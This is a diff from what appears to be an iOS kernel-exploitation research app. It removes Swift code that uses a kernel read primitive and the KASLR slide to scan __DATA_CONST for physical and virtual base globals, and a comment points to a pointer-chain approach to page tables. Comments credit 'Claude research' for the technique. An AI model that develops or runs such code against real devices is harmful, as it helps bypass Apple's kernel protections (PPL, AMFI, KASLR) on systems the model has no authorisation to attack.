@@ -3544,55 +3544,6 @@ struct AMFIExperimentView: View {
             detail += "⚠️ Unexpected value — might be slid or different format\n\n"
         }
         
-        // Read kernel __DATA segment (where globals live)
-        // ⚠️ __DATA scan causes panic — PPL protects __PPLDATA pages within __DATA range
-        // BUT: Claude research reveals gPhysBase/gVirtBase are in __DATA_CONST.__const!
-        // __DATA_CONST is READABLE from EL1 (only writes are blocked)
-        // Pattern: gPhysBase=0x800000000, gVirtBase=0xffffffe0xxxxxxxx
-        // Located within first 0x200 bytes of __DATA_CONST.__const
-        
-        // __DATA_CONST from kernelcache: vm=0xfffffff007900000, size=0x490000
-        let dataConstStart = 0xfffffff007900000 &+ kernSlide
-        detail += "\n=== Scanning __DATA_CONST for gPhysBase/gVirtBase ===\n"
-        detail += "__DATA_CONST (slid): 0x\(String(format: "%llx", dataConstStart))\n\n"
-        
-        // Scan first 0x10000 bytes (64KB) — globals might be deeper in section
-        var foundPhysBase: UInt64 = 0
-        var foundVirtBase: UInt64 = 0
-        var scanCount = 0
-        
-        for off in stride(from: UInt64(0), to: UInt64(0x10000), by: 8) {
-            let val = ds_kread64_safe(dataConstStart + off)
-            scanCount += 1
-            
-            // gPhysBase pattern: 0x800000000 (DRAM base on A12)
-            if val >= 0x800000000 && val <= 0x900000000 && (val & 0xFFF) == 0 {
-                let nextVal = ds_kread64_safe(dataConstStart + off + 8)
-                // gVirtBase pattern: 0xffffffe0xxxxxxxx (fits GEN2/GEN3 zone)
-                if nextVal > 0xffffffde00000000 && nextVal < 0xffffffe500000000 && (nextVal & 0xFFF) == 0 {
-                    foundPhysBase = val
-                    foundVirtBase = nextVal
-                    detail += "🎯 FOUND at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
-                    detail += "   gPhysBase = 0x\(String(format: "%llx", val))\n"
-                    detail += "   gVirtBase = 0x\(String(format: "%llx", nextVal))\n"
-                    break
-                }
-            }
-            
-            // Also check reversed order (gVirtBase first, gPhysBase second)
-            if val > 0xffffffde00000000 && val < 0xffffffe500000000 && (val & 0xFFF) == 0 {
-                let nextVal = ds_kread64_safe(dataConstStart + off + 8)
-                if nextVal >= 0x800000000 && nextVal <= 0x900000000 && (nextVal & 0xFFF) == 0 {
-                    foundVirtBase = val
-                    foundPhysBase = nextVal
-                    detail += "🎯 FOUND (reversed) at __DATA_CONST+0x\(String(format: "%llx", off))!\n"
-                    detail += "   gVirtBase = 0x\(String(format: "%llx", val))\n"
-                    detail += "   gPhysBase = 0x\(String(format: "%llx", nextVal))\n"
-                    break
-                }
-            }
-        }
-        
         // ============================================================
         // PRIMARY APPROACH: Pointer chain (NO __DATA scan needed!)
         // proc → proc_ro → task → vm_map → pmap → tte/ttep
